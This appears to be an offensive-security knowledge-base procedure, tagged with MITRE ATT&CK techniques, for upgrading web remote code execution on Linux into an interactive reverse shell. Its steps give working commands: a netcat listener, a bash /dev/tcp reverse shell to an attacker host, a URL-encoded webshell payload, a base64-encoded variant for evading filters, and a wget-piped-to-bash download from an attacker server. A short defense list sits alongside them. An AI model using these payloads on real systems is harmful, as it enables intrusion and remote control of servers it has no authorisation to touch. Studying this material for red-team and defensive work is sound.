---
id: 21c10b4b-9ef8-46ab-aaee-cf316b597e74
name: upgrade-website-rce-to-reverse-shell-on-linux
type: procedure
verified: true
submitted: false
created_at: '2019-12-05T01:41:02.612510+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Execution|TA0002]]'
  - '[[tactics/Command and Control|TA0011]]'
techniques:
  - '[[techniques/Command and Scripting Interpreter Unix Shell|T1059.004]]'
sub_techniques: []
tags:
  - rce
  - reverse-shell
  - linux
  - post-exploitation
commands:
  - '[[commands/base64-encode-a-command]]'
  - '[[commands/python3-launch-simple-http-server]]'
platforms:
  - Linux
  - Web
tools:
  - '[[tools/Netcat]]'
validated: true
---

# upgrade-website-rce-to-reverse-shell-on-linux

## Summary

This procedure upgrades a web-based RCE (e.g., PHP webshell) to an interactive reverse shell on Linux, using direct execution, base64 encoding to bypass filters, or file downloads.

## Description

Web RCE limits interactivity; reverse shells connect back to attacker for shell access. Methods handle filters: direct bash, encoded payloads, or wget scripts. Assumes RCE via URL like ?cmd=.

## Requirements

- Established RCE (e.g., PHP system())
- Listener on attacker (nc -lvnp $_PORT)
- Bash 4+ on target for TCP shells

## Defense

- Disable outgoing connections from web server
- Monitor process spawns from web user (e.g., www-data -> bash)
- Use AppArmor/SELinux to restrict shell execution

## Objectives

- Establish interactive shell
- Bypass command filters
- Gain terminal access for enumeration

## Instructions

### Step 1: Prepare Listener and Payload

**Context**: Set up nc listener; craft bash reverse shell.

On attacker: nc -lvnp 443. Payload: bash -i >& /dev/tcp/$_ATTACKER_IP/443 0>&1

### Step 2: Direct Execution via Webshell

**Context**: If no filters, execute directly (URL-encode in browser).

Via webshell: ?cmd=bash%20-i%20%3E%26%20/dev/tcp/$_ATTACKER_IP/443%200%3E%261

### Step 3: Base64 Encode to Bypass Filters

**Context**: Encode if special chars blocked.

**Command** ([[commands/base64-encode-a-command]]):
```bash
echo -n 'bash -i >& /dev/tcp/$_ATTACKER_IP/$_PORT 0>&1' | base64 -w 0
```

Execute: ?cmd=echo%20<encoded>%20|%20base64%20-d%20|%20bash

### Step 4: Download and Execute Script

**Context**: Host shell script on attacker server for reliable delivery.

**Command** ([[commands/python3-launch-simple-http-server]]):
```bash
python3 -m http.server $_PORT
```

Create revshell.sh with payload, then via webshell: ?cmd=wget%20$_ATTACKER_IP:$_PORT/revshell.sh%20-O%20-%20|%20bash
